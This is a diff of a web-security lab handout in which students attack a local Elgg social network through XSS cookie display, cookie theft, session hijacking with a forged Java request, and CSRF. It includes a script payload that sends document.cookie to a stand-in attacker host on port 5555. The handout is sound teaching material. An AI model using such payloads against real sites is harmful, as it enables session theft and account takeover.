@@ -179,55 +179,99 @@ following credentials:
     In the above example, the page will fetch the JavaScript program from
     http://www.example.com, which can be any web server. 
 
-Task 3: Posting a Malicious Message to Display Cookies 
-
-  The objective of this task is to embed a JavaScript program in your Elgg
-  profile, such that when another user views your profile, the user's cookies
-  will be displayed in the alert window. This can be done by adding some
-  additional code to the JavaScript program in the previous task:  
+    Our next objective is to embed a JavaScript program in your Elgg profile,
+    such that when another user views your profile, the user's cookies will be
+    displayed in the alert window. This can be done by adding some additional
+    code to the JavaScript program in the previous example:  
   
-    <script>alert(document.cookie);</script> 
+      <script>alert(document.cookie);</script> 
 
-3.1 Stealing Cookies from the Victim's machine 
+Task 3: Stealing Cookies from the Victim's machine 
 
-In the previous task, the malicious JavaScript code written by the attacker can print out the user's cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
+  In the previous task, the malicious JavaScript code written by the attacker
+  can print out the user's cookies, but only the user can see the cookies, not
+  the attacker. In this task, the attacker wants the JavaScript code to send the
+  cookies to themselves. To achieve this, the malicious JavaScript code needs to
+  send an HTTP request to the attacker, with the cookies appended to the
+  request.
  
- We can do this by having the malicious JavaScript insert an <img> tag wits src attribute set to the attacker's machine. When the JavaScript inserts the img tag, the browser tries to load the image from the URL in the src field; this results in an HTTP GET request sent to the attacker's machine. The JavaScript given below sends the cookies to the port 5555 of the attacker's machine, where the attacker has a TCP server listening to the same port. The server can print out whatever it receives. The TCP server program will be given to you.
+  We can do this by having the malicious JavaScript insert an <img> tag with src
+  attribute set to the attacker's machine. When the JavaScript inserts the img
+  tag, the browser tries to load the image from the URL in the src field; this
+  results in an HTTP GET request sent to the attacker's machine. The JavaScript
+  given below sends the cookies to the port 5555 of the attacker's machine,
+  where the attacker has a TCP server listening to the same port. The server can
+  print out whatever it receives. The TCP server program will be given to you.
  
-<script>document.write('<img src=http://attacker_IP_address:5555?c='
-			 	+ escape(document.cookie) + ' >'); 
-</script> 
+    <script>document.write('<img src=http://attacker_IP_address:5555?c='
+      + escape(document.cookie) + ' >'); 
+    </script> 
  
-Note: After you download the TCP echo server, type "make" to compile, and please read the README file on important information regarding how to start the server on port 5555. The cookie that will be printed on the terminal will be URL encoded. 
+  Note: To build the TCP echo server, type "make" in the echoserver directory to
+  compile, and please read the README file on important information regarding
+  how to start the server on port 5555. The cookie that will be printed on the
+  terminal will be URL encoded.
  
-Submission: Please submit a file called task3.txt. The grading will be done as below: We will run the echo server on localhost on port 5555. We will edit the brief description field acting as the user Alice using the message contents as specified by your task3.txt. Then, when Boby opens this message, Boby's cookie should be printed by the echo server.
+  Submission: Please submit a file called task3.txt. The grading will be done as
+  below: We will run the echo server on localhost on port 5555. We will edit the
+  brief description field acting as the user Alice using the message contents as
+  specified by your task3.txt. Then, when Boby opens this message, Boby's cookie
+  should be printed by the echo server.
+
+Task 4: Session Hijacking using the Stolen Cookies   
+
+  After stealing the victim's cookies, the attacker can do whatever the victim
+  can do to the Elgg web server, including adding and deleting friends on behalf
+  of the victim, deleting the victim's post, etc. Essentially, the attacker has
+  hijacked the victim's session. In this task, we will launch this session
+  hijacking attack, and write a program to add a friend on behalf of the victim.
+ 
+  To add a friend for the victim, we should first find out how a legitimate user
+  adds a friend in Elgg. More specifically, we need to figure out what are sent
+  to the server when a user adds a friend. A screenshot of the request is
+  provided to you. From the contents, you can identify all the parameters in the
+  request.
+ 
+  Once we have understood what the HTTP request for adding friends look like, we
+  can write a Java program to send out the same HTTP request. The Elgg server
+  cannot distinguish whether the request is sent out by the user's browser or by
+  the attacker's Java program. As long as we set all the parameters correctly,
+  and the session cookie is attached, the server will accept and process the
+  project-posting HTTP request. To simplify your task, we provide you with a
+  sample Java program that does the following:
+
+    1. Open a connection to web server.  
+    2. Set the necessary HTTP header information.  
+    3. Send the request to web server.  
+    4. Get the response from web server. 
+ 
+  Note1: Elgg uses two parameters __elgg_ts and __elgg_token. Make sure that you
+  set these parameters correctly for your attack to succeed.  Also, please note
+  down the correct guid of the friend who needs to be added to the friend list.
+  You need to use that guid in the program code for the attack to succeed.
+
+  Note2: You can compile a java program into bytecode by running javac
+  HTTPSimpleForge.java on the console. You can run the byte code by running java
+  HTTPSimpleForge.  
+ 
+  Submission: Please submit a file called HTTPSimpleForge.java.
+
+  Grading: Your java file will be compiled into byte code and executed. We will
+  login as Alice, and try to add Boby as a friend to Alice by running your
+  compiled code. Make sure you include the correct guid and parameters in the
+  code for the above scenario to execute properly.
+ 
+  Input:  Your java program should read from an input file called
+  HTTPSimpleForge.txt. The first line of the input file contains the __elgg_ts
+  token (absolute value), the second line contains the __elgg_token (absolute
+  value) and the third line would contain the Cookie value (Elgg=<<cookie
+  value>>).  You can create a text file locally for testing out your code,
+  however, you do not need to submit this file as part of your submission. We
+  will use our own HTTPSimpleForge.txt file for checking.
 
 
-3.2   Session Hijacking using the Stolen Cookies   
-
-After stealing the victim's cookies, the attacker can do whatever the victim can do to the Elgg web server, including adding and deleting friends on behalf of the victim, deleting the victim's post, etc. Essentially, the attacker has hijacked the victim's session. In this task, we will launch this session hijacking attack, and write a program to add a friend on behalf of the victim.  
- 
-To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg. More specifically, we need to figure out what are sent to the server when a user adds a friend. A screenshot of the request is provided to you. From the contents, you can identify all the parameters in the request.
- 
-Once we have understood what the HTTP request for adding friends look like, we can write a Java program to send out the same HTTP request. The Elgg server cannot distinguish whether the request is sent out by the user's browser or by the attacker's Java program. As long as we set all the parameters correctly, and the session cookie is attached, the server will accept and process the project-posting HTTP request. To simplify your task, we provide you with a sample Java program that does the following:  
- 
-1. Open a connection to web server.  
-2. Set the necessary HTTP header information.  
-3. Send the request to web server.  
-4. Get the response from web server. 
- 
-Note1: Elgg uses two parameters __elgg_ts and __elgg_token. Make sure that you set these parameters correctly for your attack to succeed.  Also, please note down the correct guid of the friend who needs to be added to the friend list.  You need to use that guid in the program code for the attack to succeed.
- 
-Note2: You can compile a java program into bytecode by running javac HTTPSimpleForge.java on the console. You can run the byte code by running java HTTPSimpleForge.  
- 
-Submission: Please submit a file called HTTPSimpleForge.java.  
-
-Grading: Your java file will be compiled into byte code and executed. We will login as Alice, and try to add Boby as a friend to Alice by running your compiled code. Make sure you include the correct guid and parameters in the code for the above scenario to execute properly.   
- 
-Input:  Your java program should read from an input file called HTTPSimpleForge.txt. The first line of the input file contains the __elgg_ts token (absolute value), the second line contains the __elgg_token (absolute value) and the third line would contain the Cookie value (Elgg=<<cookie value>>).  You can create a text file locally for testing out your code, however, you do not need to submit this file as part of your submission. We will use our own HTTPSimpleForge.txt file for checking.
-
-
-CSRF Attack Lab
+CSRF Attack
+-----------
 
 1. Overview 
 
@@ -257,9 +301,7 @@ A CSRF attack involves three actors: a trusted site (Elgg), a victim user of the
  
 The malicious site can forge both HTTP GET and POST requests for the trusted site. Some HTML tags such as img, iframe, frame, and form have no restrictions on the URL that can be used in their attribute. HTML img, iframe, and frame can be used for forging GET requests. The HTML form tag can be used for forging POST requests. Forging GET requests is relatively easier, as it does not even need the help of JavaScript; forging POST requests does need JavaScript. Since Elgg only uses POST, the tasks in this lab will only involve HTTP POST requests.
  
-4. Lab Tasks
- 
-4.1 CSRF Attack using GET Request 
+Task 5: CSRF Attack using GET Request 
  
 In this task, we need two people in the Elgg social network: Alice and Boby. Boby wants to become a friend to Alice, but Alice refuses to add Boby to her Elgg friend list. Boby decides to use the CSRF attack to achieve his goal. He sends Alice an URL (via an email or a posting in Elgg); Alice, curious about it, and clicks on the URL. Pretend that you are Boby, describe how you can construct the content of the web page, so as soon as Alice visits the web page, Boby is added to the friend list of Alice (assuming Alice has an active session with Elgg).  
  
@@ -271,7 +313,7 @@ Observe the request structure for adding a new friend and then use this to forge
  
 Submission: You are required to submit a file named task5.html. When a victim user named Alice is logged in , and visits the attacker website localhost:<<port>>/task5.html in another tab, Boby should be added as a friend to Alice's Friend List.  
  
-To test this, you will need to place the task2.html file under the directory /var/www/CSRF/elgg/ in the docker container.
+To test this, you will need to place the task5.html file under the directory /var/www/CSRF/elgg/ in the docker container.
 
 //TODO Command to copy task5.html from host to docker container directory /var/www/CSRF/elgg/  
  
